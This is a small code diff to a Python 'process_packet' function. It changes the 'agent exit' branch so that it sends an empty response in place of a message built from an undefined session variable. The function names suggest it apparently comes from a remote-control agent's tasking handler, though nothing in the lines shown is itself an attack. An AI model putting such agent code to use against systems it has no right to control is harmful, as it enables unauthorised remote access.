@@ -247,8 +247,7 @@ def process_packet(packetType, data, resultID):
     elif packetType == 2:
         # agent exit
 
-        msg = "[!] Agent %s exiting" %(sessionID)
-        send_message(build_response_packet(2, msg, resultID))
+        send_message(build_response_packet(2, "", resultID))
         agent_exit()
 
     elif packetType == 40:
